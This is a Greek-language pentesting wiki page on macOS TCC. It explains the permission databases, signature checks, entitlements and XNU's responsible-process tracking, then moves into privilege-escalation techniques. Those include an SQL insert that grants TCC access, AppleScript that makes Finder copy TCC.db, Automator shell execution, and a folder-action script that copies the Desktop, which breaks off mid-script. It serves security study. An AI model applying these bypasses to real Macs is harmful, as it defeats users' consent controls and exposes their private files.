# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **Βασικές πληροφορίες**

Το **TCC (Transparency, Consent, and Control)** είναι ένα πρωτόκολλο ασφαλείας που επικεντρώνεται στη ρύθμιση των δικαιωμάτων των εφαρμογών. Ο κύριος ρόλος του είναι η προστασία ευαίσθητων λειτουργιών, όπως οι **υπηρεσίες τοποθεσίας, οι επαφές, οι φωτογραφίες, το μικρόφωνο, η κάμερα, η προσβασιμότητα και η πλήρης πρόσβαση στον δίσκο**. Απαιτώντας τη ρητή συγκατάθεση του χρήστη πριν από την παροχή πρόσβασης της εφαρμογής σε αυτά τα στοιχεία, το TCC ενισχύει το απόρρητο και τον έλεγχο των χρηστών στα δεδομένα τους.

Οι χρήστες συναντούν το TCC όταν οι εφαρμογές ζητούν πρόσβαση σε προστατευμένες λειτουργίες. Αυτό εμφανίζεται μέσω ενός prompt που επιτρέπει στους χρήστες να **εγκρίνουν ή να απορρίψουν την πρόσβαση**. Επιπλέον, το TCC υποστηρίζει άμεσες ενέργειες του χρήστη, όπως **η μεταφορά και απόθεση αρχείων σε μια εφαρμογή**, για την παροχή πρόσβασης σε συγκεκριμένα αρχεία, διασφαλίζοντας ότι οι εφαρμογές έχουν πρόσβαση μόνο σε ό,τι επιτρέπεται ρητά.

![Ένα παράδειγμα prompt του TCC](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

Το **TCC** διαχειρίζεται από το **daemon** που βρίσκεται στο `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` και ρυθμίζεται στο `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (καταχωρίζοντας το mach service `com.apple.tccd.system`).

Υπάρχει ένα **user-mode tccd** που εκτελείται για κάθε συνδεδεμένο χρήστη, ορισμένο στο `/System/Library/LaunchAgents/com.apple.tccd.plist`, και καταχωρίζει τα mach services `com.apple.tccd` και `com.apple.usernotifications.delegate.com.apple.tccd`.

Εδώ μπορείτε να δείτε το tccd να εκτελείται ως system και ως user:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
Τα **δικαιώματα** **κληρονομούνται από τη γονική** εφαρμογή και τα **δικαιώματα** **παρακολουθούνται** με βάση το **Bundle ID** και το **Developer ID**.

### Βάσεις δεδομένων TCC

Οι επιτρεπτές/απαγορευμένες ενέργειες αποθηκεύονται έπειτα σε ορισμένες βάσεις δεδομένων TCC:

- Η βάση δεδομένων σε επίπεδο συστήματος στο **`/Library/Application Support/com.apple.TCC/TCC.db`** .
- Αυτή η βάση δεδομένων προστατεύεται από το **SIP**, επομένως μόνο ένα SIP bypass μπορεί να γράψει σε αυτήν.
- Η βάση δεδομένων TCC του χρήστη **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** για προτιμήσεις ανά χρήστη.
- Αυτή η βάση δεδομένων προστατεύεται, επομένως μόνο διεργασίες με υψηλά δικαιώματα TCC, όπως το Full Disk Access, μπορούν να γράψουν σε αυτήν (αλλά δεν προστατεύεται από το SIP).

> [!WARNING]
> Οι προηγούμενες βάσεις δεδομένων προστατεύονται επίσης από το **TCC για πρόσβαση ανάγνωσης**. Επομένως, **δεν θα μπορείτε να διαβάσετε** την κανονική βάση δεδομένων TCC του χρήστη σας, εκτός αν η πρόσβαση γίνεται από διεργασία με δικαιώματα TCC.
>
> Ωστόσο, θυμηθείτε ότι μια διεργασία με αυτά τα υψηλά δικαιώματα (όπως το **FDA** ή το **`kTCCServiceEndpointSecurityClient`**) θα μπορεί να γράψει στη βάση δεδομένων TCC των χρηστών

- Υπάρχει μια **τρίτη** βάση δεδομένων TCC στο **`/var/db/locationd/clients.plist`**, η οποία υποδεικνύει τους clients που επιτρέπεται να **έχουν πρόσβαση στις υπηρεσίες τοποθεσίας**.
- Το αρχείο που προστατεύεται από το SIP **`/Users/carlospolop/Downloads/REG.db`** (επίσης προστατεύεται από την πρόσβαση ανάγνωσης μέσω TCC) περιέχει την **τοποθεσία** όλων των **έγκυρων βάσεων δεδομένων TCC**.
- Το αρχείο που προστατεύεται από το SIP **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (επίσης προστατεύεται από την πρόσβαση ανάγνωσης μέσω TCC) περιέχει επιπλέον δικαιώματα που έχουν παραχωρηθεί από το TCC.
- Το αρχείο που προστατεύεται από το SIP **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (είναι αναγνώσιμο από οποιονδήποτε) είναι μια allow list εφαρμογών που απαιτούν εξαίρεση TCC.

> [!TIP]
> Η βάση δεδομένων TCC στο **iOS** βρίσκεται στο **`/private/var/mobile/Library/TCC/TCC.db`**

> [!TIP]
> Το **notification center UI** μπορεί να κάνει **αλλαγές στη βάση δεδομένων TCC του συστήματος**:
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
>
> Ωστόσο, οι χρήστες μπορούν να **διαγράφουν ή να υποβάλλουν ερωτήματα για κανόνες** με το βοηθητικό πρόγραμμα γραμμής εντολών **`tccutil`**.

#### Υποβολή ερωτημάτων στις βάσεις δεδομένων

{{#tabs}}
{{#tab name="user DB"}}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}

{{#tab name="system DB"}}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}
{{#endtabs}}

> [!TIP]
> Ελέγχοντας και τις δύο βάσεις δεδομένων, μπορείτε να ελέγξετε τα δικαιώματα που μια εφαρμογή έχει επιτρέψει, έχει απαγορεύσει ή δεν διαθέτει (θα τα ζητήσει).

- Το **`service`** είναι η αναπαράσταση συμβολοσειράς του TCC **δικαιώματος**
- Το **`client`** είναι το **bundle ID** ή η **διαδρομή προς το binary** με τα δικαιώματα
- Το **`client_type`** υποδεικνύει αν πρόκειται για Bundle Identifier(0) ή απόλυτη διαδρομή(1)

<details>

<summary>Πώς να το εκτελέσετε αν πρόκειται για απόλυτη διαδρομή</summary>

Απλώς εκτελέστε **`launctl load you_bin.plist`**, με ένα plist όπως:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
- Το **`auth_value`** μπορεί να έχει διαφορετικές τιμές: denied(0), unknown(1), allowed(2) ή limited(3).
- Το **`auth_reason`** μπορεί να λάβει τις ακόλουθες τιμές: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
- Το πεδίο **`csreq`** υποδεικνύει τον τρόπο επαλήθευσης του binary που θα εκτελεστεί και χορήγησης των δικαιωμάτων TCC:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
- Για περισσότερες πληροφορίες σχετικά με τα **άλλα πεδία** του πίνακα [**δείτε αυτήν την ανάρτηση ιστολογίου**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).<sup>[[1]](#references)</sup>

Μπορείτε επίσης να ελέγξετε τις **ήδη εκχωρημένες άδειες** σε εφαρμογές στο `System Preferences --> Security & Privacy --> Privacy --> Files and Folders`.

> [!TIP]
> Οι χρήστες _μπορούν_ να **διαγράψουν ή να αναζητήσουν κανόνες** χρησιμοποιώντας το **`tccutil`**.

#### Επαναφορά αδειών TCC
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### Έλεγχοι υπογραφής TCC

Η **βάση δεδομένων** του TCC αποθηκεύει το **Bundle ID** της εφαρμογής, αλλά επίσης **αποθηκεύει** **πληροφορίες** σχετικά με την **υπογραφή**, ώστε να **διασφαλίζει** ότι η εφαρμογή που ζητά να χρησιμοποιήσει την άδεια είναι η σωστή.
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
> [!WARNING]
> Επομένως, άλλες εφαρμογές που χρησιμοποιούν το ίδιο όνομα και bundle ID δεν θα μπορούν να έχουν πρόσβαση στα permissions που έχουν εκχωρηθεί σε άλλες εφαρμογές.

### Entitlements & TCC Permissions

Οι εφαρμογές **δεν χρειάζεται μόνο να ζητήσουν** και να **τους εκχωρηθεί πρόσβαση** σε ορισμένους πόρους· χρειάζεται επίσης να **διαθέτουν τα σχετικά entitlements**.\
Για παράδειγμα, το **Telegram** διαθέτει το entitlement `com.apple.security.device.camera` για να ζητήσει **πρόσβαση στην κάμερα**. Μια **εφαρμογή** που **δεν διαθέτει** αυτό το **entitlement δεν θα μπορεί** να αποκτήσει πρόσβαση στην κάμερα (και ο χρήστης δεν θα ερωτηθεί καν για τα permissions).

Σημειώστε ότι τα entitlements είναι αρχεία plist και αποτελούν μέρος του code sig, ενώ κατακερματίζονται περαιτέρω στο code sig μέσω ειδικών slots και μπορούν είτε να ερωτηθούν στον kernel από κώδικα του kernel είτε από user model code χρησιμοποιώντας τα `csops(#169)` ή `csops_audittoken(#170)`.

Ωστόσο, για να **αποκτήσουν πρόσβαση** σε **συγκεκριμένους φακέλους χρηστών**, όπως οι `~/Desktop`, `~/Downloads` και `~/Documents`, οι εφαρμογές **δεν χρειάζεται** να διαθέτουν συγκεκριμένα **entitlements**. Το σύστημα θα χειριστεί διαφανώς την πρόσβαση και θα **ζητήσει επιβεβαίωση από τον χρήστη** όταν χρειάζεται.

- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)

Οι εφαρμογές της Apple **δεν θα δημιουργήσουν prompts**. Περιέχουν **δικαιώματα που έχουν εκχωρηθεί εκ των προτέρων** στη λίστα **entitlements** τους, πράγμα που σημαίνει ότι **δεν θα δημιουργήσουν ποτέ popup**, **ούτε** θα εμφανίζονται σε κάποια από τις **βάσεις δεδομένων TCC**. Για παράδειγμα:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
Αυτό θα αποτρέψει το Calendar από το να ζητήσει από τον χρήστη πρόσβαση στις υπενθυμίσεις, στο ημερολόγιο και στο βιβλίο διευθύνσεων.

> [!TIP]
> Εκτός από κάποια επίσημη τεκμηρίωση σχετικά με τα entitlements, είναι επίσης δυνατό να βρείτε ανεπίσημες **ενδιαφέρουσες πληροφορίες σχετικά με τα entitlements στο** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)

Ορισμένα TCC permissions είναι: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Δεν υπάρχει δημόσια λίστα που να ορίζει όλα τα permissions, αλλά μπορείτε να ελέγξετε αυτήν τη [**λίστα των γνωστών permissions**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).<sup>[[1]](#references)</sup>

### Ευαίσθητες μη προστατευμένες τοποθεσίες

- $HOME (το ίδιο)
- $HOME/.ssh, $HOME/.aws, κ.λπ.
- /tmp

### Πρόθεση χρήστη / com.apple.macl

Όπως αναφέρθηκε προηγουμένως, είναι δυνατό να **παραχωρήσετε πρόσβαση σε ένα App σε ένα αρχείο σύροντάς\&το αποθέτοντάς το σε αυτό**. Αυτή η πρόσβαση δεν θα καθορίζεται σε κάποια TCC database, αλλά ως **extended** **attribute του αρχείου**. Αυτό το attribute θα **αποθηκεύει το UUID** του επιτρεπόμενου app:<sup>[[2]](#references)</sup>
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
> [!TIP]
> Είναι ενδιαφέρον ότι το attribute **`com.apple.macl`** διαχειρίζεται από το **Sandbox**, όχι από το tccd.
>
> Σημειώστε επίσης ότι αν μετακινήσετε ένα αρχείο που επιτρέπει στο UUID μιας εφαρμογής στον υπολογιστή σας να μεταφερθεί σε διαφορετικό υπολογιστή, επειδή η ίδια εφαρμογή θα έχει διαφορετικά UIDs, δεν θα παραχωρήσει πρόσβαση σε αυτή την εφαρμογή.

Το extended attribute `com.apple.macl` **δεν μπορεί να εκκαθαριστεί** όπως άλλα extended attributes, επειδή **προστατεύεται από το SIP**. Ωστόσο, όπως [**εξηγείται σε αυτήν την ανάρτηση**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), είναι δυνατή η απενεργοποίησή του **με τη συμπίεση** του αρχείου, τη **διαγραφή** του και την **αποσυμπίεσή** του.<sup>[[3]](#references)</sup>






## Μηχανισμός Υπεύθυνης Διεργασίας του XNU

Στα macOS/iOS, ο μηχανισμός **υπεύθυνης διεργασίας** είναι ένα κρίσιμο χαρακτηριστικό ασφαλείας που χρησιμοποιείται από το framework **TCC (Transparency, Consent, and Control)** και άλλα συστήματα ασφαλείας, για την παρακολούθηση της διεργασίας που είναι τελικά υπεύθυνη για μια ενέργεια, ακόμη και μέσω αλυσίδων child processes.

Όταν το TCC ελέγχει δικαιώματα (π.χ. κάμερα, μικρόφωνο, τοποθεσία), δεν ελέγχει πάντα την άμεση διεργασία που πραγματοποιεί το αίτημα. Αντίθετα, ελέγχει την **υπεύθυνη διεργασία** - συνήθως τη GUI εφαρμογή που ξεκίνησε την ενέργεια, ακόμη και αν το πραγματικό αίτημα προέρχεται από μια helper process ή daemon.

<details>
<summary>Πώς ορίζεται η Υπεύθυνη Διεργασία</summary>

### Πεδία Δομής Διεργασίας

Κάθε διεργασία στο XNU διατηρεί δύο βασικά αναγνωριστικά UUID:
```c
// From bsd/sys/proc_internal.h
struct proc {
// ...
pid_t   p_responsible_pid;          // PID of the responsible process
uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)
uint8_t p_responsible_uuid[16];     // UUID of pid responsible for this process
// ...
};
```
- **`p_uuid`**: Το UUID της ίδιας της διεργασίας (από την εντολή φόρτωσης `LC_UUID` του binary Mach-O)
- **`p_responsible_pid`**: Το PID της υπεύθυνης διεργασίας
- **`p_responsible_uuid`**: Το UUID της υπεύθυνης διεργασίας (διατηρείται ακόμη και μετά τον τερματισμό της διεργασίας)

### Πώς ορίζεται η υπεύθυνη διεργασία

1. **Κατά τη δημιουργία διεργασίας (Fork)**

Όταν δημιουργείται μια νέα διεργασία μέσω των `fork()` ή `posix_spawn()`, η υπεύθυνη διεργασία κληρονομείται από τη γονική διεργασία (η κλήση συστήματος `exec()` επαναχρησιμοποιεί την υπάρχουσα δομή `proc`, επομένως αυτό το βήμα δεν επαναλαμβάνεται εκεί):

**Τοποθεσία**: `bsd/kern/kern_fork.c:1053`
```c
// In fork1_internal() - called during all process creation
proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);
```
**Βασικά σημεία:**
- Οι child processes **κληρονομούν** το `p_responsible_pid` του parent
- Αυτό δημιουργεί μια **αλυσίδα ευθύνης** μέσω της ιεραρχίας των processes
- Η responsible process συνήθως παραπέμπει στην αρχική GUI application

2. **Η βασική function: `proc_set_responsible_pid()`**

**Τοποθεσία**: `bsd/kern/kern_proc.c:4817-4831`
```c
void
proc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)
{
target_proc->p_responsible_pid = responsible_pid;

if (responsible_pid >= 0) {
proc_t responsible_proc = proc_find(responsible_pid);
if (responsible_proc != PROC_NULL) {
// Copy the responsible process's UUID for persistent identification
proc_getexecutableuuid(responsible_proc,
target_proc->p_responsible_uuid,
sizeof(target_proc->p_responsible_uuid));
proc_rele(responsible_proc);
}
}
return;
}
```
**Τι κάνει αυτή η συνάρτηση:**
1. **Ορίζει το υπεύθυνο PID** στη διεργασία-στόχο
2. **Εντοπίζει την υπεύθυνη διεργασία** χρησιμοποιώντας τη `proc_find()` (αυξάνει το reference count)
3. **Αντιγράφει το UUID** από το `p_uuid` της υπεύθυνης διεργασίας στο `p_responsible_uuid` της διεργασίας-στόχου
4. **Αποδεσμεύει το reference** με τη `proc_rele()` (μειώνει το reference count)

3. **Γιατί αποθηκεύονται τόσο το PID όσο και το UUID;**

Η προσέγγιση διπλής αποθήκευσης επιλύει ένα κρίσιμο πρόβλημα:

| Πεδίο | Σκοπός | Πρόβλημα | Λύση |
|-------|---------|---------|----------|
| `p_responsible_pid` | Γρήγορη αναζήτηση της τρέχουσας διεργασίας | Το PID μπορεί να επαναχρησιμοποιηθεί μετά τον τερματισμό της διεργασίας | Χρησιμοποιείται για την αναζήτηση ενεργών διεργασιών |
| `p_responsible_uuid` | Persistent ταυτοποίηση | Επιβιώνει από τον τερματισμό της διεργασίας | Χρησιμοποιείται για security checks και auditing |

**Το πρόβλημα**: Αν η υπεύθυνη διεργασία τερματιστεί πριν από τη child διεργασία, το PID μπορεί να ανακυκλωθεί και να εκχωρηθεί σε μια εντελώς διαφορετική διεργασία.

**Η λύση**: Το UUID είναι immutable και ταυτοποιεί μοναδικά το συγκεκριμένο binary που ήταν υπεύθυνο, ακόμη και μετά τον τερματισμό του.

### Ροή δημιουργίας διεργασίας
```
┌─────────────────────────────────────────────────────────────┐
│ Parent Process (e.g., Safari)                               │
│ p_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81              │
│ p_responsible_pid: 1234 (points to itself)                 │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
└─────────────────────┬───────────────────────────────────────┘
│
│ fork() / posix_spawn()
▼
┌────────────────────────────┐
│ kern_fork.c:fork1_internal │
│                            │
│ proc_set_responsible_pid(  │
│   child_proc,              │
│   parent->p_responsible_pid│
│ );                         │
└────────────┬───────────────┘
│
▼
┌────────────────────────────┐
│ proc_set_responsible_pid() │
│                            │
│ 1. Set p_responsible_pid   │
│ 2. Find responsible proc   │
│ 3. Copy UUID               │
│ 4. Release reference       │
└────────────┬───────────────┘
│
▼
┌─────────────────────────────────────────────────────────────┐
│ Child Process (e.g., SafariHelper)                          │
│ p_uuid: B266C9DD-8E3F-4AAA-9F1E-71D2E3CDEF82              │
│ p_responsible_pid: 1234 (inherited from parent)            │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
│                     (copied from Safari)                    │
└─────────────────────────────────────────────────────────────┘
```
### Πηγή UUID: Εντολή φόρτωσης LC_UUID

Το UUID που είναι αποθηκευμένο στο `p_uuid` προέρχεται από την **εντολή φόρτωσης `LC_UUID` του εκτελέσιμου Mach-O**:

1. **Χρόνος μεταγλώττισης**
```bash
# When linking, the linker (ld) generates a unique UUID
$ ld -o myapp myapp.o
# Embedded in the Mach-O binary as LC_UUID load command
```
2. **Χρόνος εκτέλεσης**

**Τοποθεσία**: `bsd/kern/mach_loader.c:2393-2413`
```c
static load_return_t
load_uuid(struct uuid_command *uulp, char *command_end, load_result_t *result)
{
if ((uulp->cmdsize < sizeof(struct uuid_command)) ||
(((char *)uulp + sizeof(struct uuid_command)) > command_end)) {
return LOAD_BADMACHO;
}

// Extract UUID from LC_UUID load command
memcpy(&result->uuid[0], &uulp->uuid[0], sizeof(result->uuid));
return LOAD_SUCCESS;
}
```
3. **Αποθηκευμένο στη Δομή Διεργασίας**

**Τοποθεσία**: `bsd/kern/kern_exec.c:2281`
```c
// After loading the Mach-O binary during exec()
proc_setexecutableuuid(p, &load_result.uuid[0]);
```
**Τοποθεσία**: `bsd/kern/kern_proc.c:1912-1915`
```c
void
proc_setexecutableuuid(proc_t p, const unsigned char *uuid)
{
memcpy(p->p_uuid, uuid, sizeof(p->p_uuid));
}
```
</details>


## TCC Privesc & Bypasses

### Εισαγωγή στο TCC

Αν κάποια στιγμή καταφέρετε να αποκτήσετε write access σε μια TCC database, μπορείτε να χρησιμοποιήσετε κάτι σαν το παρακάτω για να προσθέσετε μια entry (αφαιρέστε τα σχόλια):

<details>

<summary>Παράδειγμα εισαγωγής στο TCC</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Payloads

Αν καταφέρατε να εισέλθετε σε μια εφαρμογή με ορισμένα TCC permissions, ελέγξτε την ακόλουθη σελίδα με TCC payloads για να τα εκμεταλλευτείτε:


{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Μάθετε για τα Apple Events στη διεύθυνση:


{{#ref}}
macos-apple-events.md
{{#endref}}

### Automation (Finder) to FDA\*

Το όνομα TCC του Automation permission είναι: **`kTCCServiceAppleEvents`**\
Αυτό το συγκεκριμένο TCC permission υποδεικνύει επίσης την **εφαρμογή που μπορεί να γίνει managed** μέσα στη βάση δεδομένων TCC (επομένως το permission δεν επιτρέπει τη διαχείριση των πάντων).

Το **Finder** είναι μια εφαρμογή που **έχει πάντα FDA** (ακόμη και αν δεν εμφανίζεται στο UI), επομένως, αν έχετε **Automation** privileges πάνω σε αυτό, μπορείτε να εκμεταλλευτείτε τα privileges του για να **το κάνετε να εκτελέσει ορισμένες ενέργειες**.\
Σε αυτήν την περίπτωση, η εφαρμογή σας θα χρειαζόταν το permission **`kTCCServiceAppleEvents`** πάνω στο **`com.apple.Finder`**.<sup>[[4]](#references)</sup>

{{#tabs}}
{{#tab name="Steal users TCC.db"}}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}

{{#tab name="Steal systems TCC.db"}}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}
{{#endtabs}}

Θα μπορούσατε να το εκμεταλλευτείτε για να **γράψετε τη δική σας user TCC database**.

> [!WARNING]
> Με αυτή την άδεια θα μπορείτε να **ζητήσετε από το Finder να αποκτήσει πρόσβαση σε φακέλους που περιορίζονται από το TCC** και να σας δώσει τα αρχεία, αλλά απ' όσο γνωρίζω **δεν θα μπορείτε να κάνετε το Finder να εκτελέσει arbitrary code** ώστε να εκμεταλλευτείτε πλήρως την πρόσβασή του μέσω FDA.
>
> Επομένως, δεν θα μπορείτε να εκμεταλλευτείτε πλήρως τις δυνατότητες του FDA.

Αυτό είναι το TCC prompt για την απόκτηση δικαιωμάτων Automation στο Finder:

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> Σημειώστε ότι επειδή η εφαρμογή **Automator** διαθέτει την άδεια TCC **`kTCCServiceAppleEvents`**, μπορεί να **ελέγχει οποιαδήποτε εφαρμογή**, όπως το Finder. Επομένως, έχοντας την άδεια ελέγχου του Automator, θα μπορούσατε επίσης να ελέγξετε το **Finder** με κώδικα όπως ο παρακάτω:

<details>

<summary>Απόκτηση shell μέσα στο Automator</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

Το ίδιο συμβαίνει με την εφαρμογή **Script Editor,** η οποία μπορεί να ελέγξει το Finder, αλλά με τη χρήση ενός AppleScript δεν μπορείτε να την αναγκάσετε να εκτελέσει ένα script.

### Automation (SE) προς κάποια TCC

**Το System Events μπορεί να δημιουργήσει Folder Actions και τα Folder Actions μπορούν να αποκτήσουν πρόσβαση σε ορισμένους φακέλους TCC** (Desktop, Documents & Downloads), επομένως ένα script όπως το παρακάτω μπορεί να χρησιμοποιηθεί για την εκμετάλλευση αυτής της συμπεριφοράς:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
